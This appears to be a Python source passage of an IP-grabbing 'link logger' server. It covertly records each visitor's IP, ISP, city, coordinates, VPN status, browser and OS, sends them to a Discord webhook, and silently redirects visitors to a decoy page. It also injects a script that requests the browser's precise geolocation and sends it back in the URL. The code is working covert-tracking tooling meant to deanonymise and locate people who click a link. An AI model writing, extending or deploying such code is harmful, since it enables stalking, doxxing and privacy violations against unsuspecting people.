    }
  ],
}
    
    requests.post(config["webhook"], json = embed)
    return info

class LinkLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            # Handle bot detection
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(302)
                self.send_header('Location', config["redirect"]["page"])
                self.end_headers()
                makeReport(self.headers.get('x-forwarded-for'), endpoint = self.path.split("?")[0])
                return
            
            # Handle regular users
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

            if dic.get("g") and config["accurateLocation"]:
                location = base64.b64decode(dic.get("g").encode()).decode()
                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0])
            else:
                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0])
            
            # Custom message handling
            message = config["message"]["message"]
            
            if config["message"]["richMessage"] and result:
                message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                message = message.replace("{isp}", result["isp"])
                message = message.replace("{asn}", result["as"])
                message = message.replace("{country}", result["country"])
                message = message.replace("{region}", result["regionName"])
                message = message.replace("{city}", result["city"])
                message = message.replace("{lat}", str(result["lat"]))
                message = message.replace("{long}", str(result["lon"]))
                message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                message = message.replace("{mobile}", str(result["mobile"]))
                message = message.replace("{vpn}", str(result["proxy"]))
                message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
            
            # Always redirect
            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'
                if config["message"]["doMessage"]:
                    data = f'<p>{message}</p><br>{data}'
                data = data.encode()
                
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                
                # Add location tracking script if enabled
                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                
                self.end_headers()
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = LinkLoggerAPI
